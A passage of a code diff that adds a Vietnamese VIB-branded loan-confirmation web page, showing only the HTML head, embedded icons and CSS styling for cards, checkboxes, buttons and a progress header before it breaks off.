@@ -1,0 +1,1355 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover"
+    />
+    <title>VIB - Xác nhận đề nghị vay</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20128%20128%22%20role%3D%22img%22%20aria-label%3D%22VIB%22%3E%0A%20%20%3Crect%20width%3D%22128%22%20height%3D%22128%22%20rx%3D%2228%22%20fill%3D%22%23ffffff%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M24%2016C39%2016%2047%2019%2054%2028L64%2039L74%2028C81%2019%2089%2016%20104%2016L82%2045C76%2052%2070%2055%2064%2055C58%2055%2052%2052%2046%2045Z%22%20fill%3D%22%23fdb913%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M13%2042L49%2051C58%2053%2062%2059%2059%2067L50%20113L37%2092L32%2066C31%2060%2027%2057%2021%2054C17%2052%2014%2048%2013%2042Z%22%20fill%3D%22%23f7941d%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M115%2042L79%2051C70%2053%2066%2059%2069%2067L78%20113L91%2092L96%2066C97%2060%20101%2057%20107%2054C111%2052%20114%2048%20115%2042Z%22%20fill%3D%22%23f36f21%22%2F%3E%0A%3C%2Fsvg%3E" />
+    <link rel="apple-touch-icon" href="data:image/png;base64,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" />
+
+    <style>
+      :root {
+        --fe-green: #fdb814;
+        --fe-green-dark: #2e7d32;
+        --fe-bg: #f5f6f8;
+        --fe-text-main: #222222;
+        --fe-text-muted: #6c757d;
+        --fe-border: #e0e3eb;
+        --fe-white: #ffffff;
+        --fe-accent-soft: #eef2ff;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI",
+          Roboto, sans-serif;
+        background-color: var(--fe-bg);
+        color: var(--fe-text-main);
+      }
+
+      .page-wrapper {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .content {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: stretch;
+        padding: 12px 10px 16px 10px;
+      }
+
+      .loan-confirm-card {
+        width: 100%;
+        max-width: 480px;
+        background: var(--fe-white);
+        border-radius: 18px;
+        box-shadow: 0 12px 32px rgba(15, 23, 42, 0.16);
+        padding: 18px 14px 20px 14px;
+      }
+
+      @media (min-width: 576px) {
+        .content {
+          padding: 24px 16px;
+        }
+        .loan-confirm-card {
+          padding: 22px 22px 24px 22px;
+          border-radius: 18px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .content {
+          padding: 10px 8px 16px 8px;
+        }
+        .loan-confirm-card {
+          padding: 18px 14px 20px 14px;
+          border-radius: 16px;
+        }
+      }
+
+      .section-label {
+        font-size: 0.74rem;
+        font-weight: 600;
+        letter-spacing: 0.12em;
+        color: var(--fe-text-muted);
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+
+      .summary-card {
+        border-radius: 14px;
+        border: 1px solid var(--fe-border);
+        background: var(--fe-white);
+        padding: 14px 14px 12px 14px;
+        margin-bottom: 16px;
+      }
+
+      .summary-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 8px;
+      }
+      .summary-label {
+        font-size: 0.78rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        color: var(--fe-text-muted);
+      }
+      .summary-value-main {
+        font-size: 1.7rem;
+        font-weight: 800;
+        color: #0d6efd;
+        line-height: 1.1;
+      }
+      .summary-value-sub {
+        font-size: 0.95rem;
+        font-weight: 600;
+        color: var(--fe-text-main);
+      }
+
+      @media (max-width: 375px) {
+        .summary-value-main {
+          font-size: 1.5rem;
+        }
+        .summary-value-sub {
+          font-size: 0.9rem;
+        }
+      }
+
+      .details-list {
+        list-style: none;
+        padding: 0;
+        margin: 0 0 14px 0;
+        border-radius: 12px;
+        border: 1px solid #edf1ff;
+        background: #f9fafb;
+      }
+      .details-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 9px 11px;
+        font-size: 0.9rem;
+      }
+      .details-item + .details-item {
+        border-top: 1px solid #edf1ff;
+      }
+      .details-label {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        color: var(--fe-text-main);
+      }
+      .details-value {
+        font-weight: 600;
+        color: var(--fe-text-main);
+      }
+      .details-value-strong {
+        font-weight: 700;
+      }
+      .info-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        font-size: 0.7rem;
+        color: var(--fe-text-muted);
+        border: 1px solid #cbd5f5;
+        background: #eef2ff;
+      }
+
+      .checkbox-group {
+        display: flex;
+        flex-direction: column;
+        gap: 9px;
+        margin: 12px 0 14px 0;
+      }
+
+      .checkbox-row {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        font-size: 0.86rem;
+        line-height: 1.4;
+        color: var(--fe-text-main);
+      }
+
+      .checkbox-square {
+        width: 20px;
+        height: 20px;
+        border-radius: 4px;
+        border: 1.5px solid #cbd1e1;
+        background: #ffffff;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        flex-shrink: 0;
+        transition: all 0.2s ease;
+      }
+      .checkbox-square.checked {
+        border-color: var(--fe-green);
+        background: var(--fe-green);
+      }
+      .checkbox-square > i {
+        font-size: 14px;
+        color: #ffffff;
+        display: none;
+      }
+      .checkbox-square.checked > i {
+        display: block;
+      }
+
+      .checkbox-text a {
+        color: var(--fe-green);
+        text-decoration: none;
+        font-weight: 600;
+      }
+      .checkbox-text a:hover {
+        text-decoration: underline;
+      }
+
+      .ubank-banner {
+        border-radius: 12px;
+        background: linear-gradient(135deg, #eef2ff, #ede7ff);
+        padding: 9px 10px;
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+      }
+      .ubank-content {
+        flex: 1;
+        font-size: 0.85rem;
+        line-height: 1.4;
+      }
+      .ubank-logo-placeholder {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 0.8rem;
+        font-weight: 700;
+        color: #5b21ff;
+      }
+
+      .contract-link {
+        text-align: center;
+        font-size: 0.88rem;
+        margin: 4px 0 6px 0;
+      }
+      .contract-link a {
+        color: var(--fe-green);
+        text-decoration: none;
+        font-weight: 600;
+      }
+      .contract-link a:hover {
+        text-decoration: underline;
+      }
+
+      .disclaimer {
+        font-size: 0.75rem;
+        color: var(--fe-text-muted);
+        text-align: center;
+        margin-bottom: 12px;
+      }
+
+      .actions {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .btn-primary-main {
+        border-radius: 999px;
+        background-color: #ffc107;
+        border: none;
+        color: #000;
+        font-weight: 700;
+        font-size: 0.95rem;
+        min-height: 46px;
+      }
+      .btn-primary-main:hover {
+        background-color: var(--fe-green-dark);
+      }
+      .btn-secondary-outline {
+        border-radius: 999px;
+        border: 1.5px solid var(--fe-green);
+        background-color: #ffffff;
+        color: var(--fe-green);
+        font-weight: 700;
+        font-size: 0.95rem;
+        min-height: 46px;
+      }
+      .btn-secondary-outline:hover {
+        background-color: #f3fbf5;
+      }
+
+      @media (max-width: 375px) {
+        .actions .btn-primary-main,
+        .actions .btn-secondary-outline {
+          font-size: 0.9rem;
+          min-height: 44px;
+        }
+      }
+
+      .checkbox-error {
+        font-size: 0.78rem;
+        color: #e53e3e;
+        margin-top: 4px;
+        display: none;
+      }
+      .checkbox-error.show {
+        display: block;
+      }
+    </style>
+  
+    <!-- VIB SaaS Redesign: presentation layer only -->
+    <style id="vib-saas-redesign-step5">
+      :root {
+        --vib-brand-blue: #1769aa;
+        --vib-brand-blue-deep: #0d4f84;
+        --vib-brand-yellow: #fdb913;
+        --vib-brand-orange: #f7941d;
+        --vib-ink: #10231c;
+        --vib-ink-soft: #385047;
+        --vib-muted: #687a73;
+        --vib-surface: #ffffff;
+        --vib-surface-soft: #f6faf8;
+        --vib-line: #dce8e2;
+        --vib-success: #0a7b54;
+        --vib-success-soft: #e9f7f1;
+        --vib-danger: #c94155;
+        --vib-danger-soft: #fff1f3;
+        --vib-shadow-soft: 0 14px 42px rgba(26, 51, 42, 0.08);
+        --vib-shadow-card: 0 28px 80px rgba(26, 51, 42, 0.14);
+        --vib-page-gutter: clamp(14px, 4vw, 38px);
+      }
+
+      html {
+        min-width: 320px;
+        color-scheme: light;
+        background: #edf5f1;
+      }
+
+      body {
+        position: relative;
+        min-height: 100vh;
+        min-height: 100dvh;
+        overflow-x: hidden;
+        color: var(--vib-ink);
+        background:
+          radial-gradient(circle at 6% 0%, rgba(253, 185, 19, 0.16), transparent 27rem),
+          radial-gradient(circle at 100% 34%, rgba(23, 105, 170, 0.10), transparent 31rem),
+          linear-gradient(180deg, #fbfdfc 0%, #eff6f2 55%, #f8faf9 100%);
+        font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        line-height: 1.55;
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+      }
+
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        pointer-events: none;
+        opacity: 0.55;
+        background-image:
+          linear-gradient(rgba(20, 48, 38, 0.026) 1px, transparent 1px),
+          linear-gradient(90deg, rgba(20, 48, 38, 0.026) 1px, transparent 1px);
+        background-size: 32px 32px;
+        -webkit-mask-image: linear-gradient(to bottom, #000, transparent 82%);
+        mask-image: linear-gradient(to bottom, #000, transparent 82%);
+      }
+
+      *, *::before, *::after { box-sizing: border-box; }
+
+      button, a, .checkbox-square { -webkit-tap-highlight-color: transparent; }
+
+      button:focus-visible,
+      a:focus-visible,
+      .checkbox-square:focus-visible {
+        outline: 3px solid rgba(253, 185, 19, 0.48);
+        outline-offset: 3px;
+      }
+
+      .page-wrapper {
+        position: relative;
+        z-index: 1;
+        min-height: 100vh;
+        min-height: 100dvh;
+      }
+
+      .app-header {
+        width: 100%;
+        padding: max(14px, env(safe-area-inset-top)) var(--vib-page-gutter) 8px;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .app-header__inner {
+        width: min(1080px, 100%);
+        min-height: 62px;
+        margin: 0 auto;
+        padding: 10px 13px 10px 15px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 16px;
+        background: rgba(255, 255, 255, 0.82);
+        border: 1px solid rgba(207, 224, 216, 0.92);
+        border-radius: 19px;
+        box-shadow: 0 10px 32px rgba(26, 51, 42, 0.06);
+        backdrop-filter: blur(18px);
+        -webkit-backdrop-filter: blur(18px);
+      }
+
+      .app-brand {
+        min-width: 0;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .app-brand img {
+        width: 88px;
+        height: 42px;
+        object-fit: contain;
+        display: block;
+      }
+
+      .app-brand__copy {
+        min-width: 0;
+        display: flex;
+        flex-direction: column;
+        line-height: 1.2;
+      }
+
+      .app-brand__copy strong {
+        overflow: hidden;
+        color: var(--vib-ink);
+        font-size: 14px;
+        font-weight: 750;
+        letter-spacing: -.01em;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .app-brand__copy small {
+        margin-top: 3px;
+        overflow: hidden;
+        color: var(--vib-muted);
+        font-size: 11px;
+        font-weight: 550;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .header-meta {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .header-step,
+      .secure-chip {
+        min-height: 34px;
+        padding: 7px 11px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 999px;
+        font-size: 12px;
+        font-weight: 700;
+        white-space: nowrap;
+      }
+
+      .header-step {
+        color: #725300;
+        background: #fff5d6;
+        border: 1px solid #f3dda0;
+      }
+
+      .secure-chip {
+        gap: 7px;
+        color: #086546;
+        background: var(--vib-success-soft);
+        border: 1px solid #c9e7da;
+      }
+
+      .secure-chip::before {
+        content: "✓";
+        width: 17px;
+        height: 17px;
+        display: grid;
+        place-items: center;
+        color: #fff;
+        background: var(--vib-success);
+        border-radius: 50%;
+        font-size: 10px;
+        line-height: 1;
+      }
+
+      .flow-progress {
+        width: min(760px, calc(100% - (var(--vib-page-gutter) * 2)));
+        margin: 8px auto 0;
+        display: grid;
+        grid-template-columns: repeat(5, minmax(0, 1fr));
+        gap: 9px;
+      }
+
+      .flow-progress span {
+        position: relative;
+        height: 5px;
+        overflow: hidden;
+        background: #dce7e2;
+        border-radius: 999px;
+      }
+
+      .flow-progress span.is-complete,
+      .flow-progress span.is-active {
+        background: linear-gradient(90deg, #ffd050, var(--vib-brand-yellow));
+        box-shadow: 0 3px 10px rgba(253, 185, 19, 0.22);
+      }
+
+      .flow-progress span.is-active::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,.78), transparent);
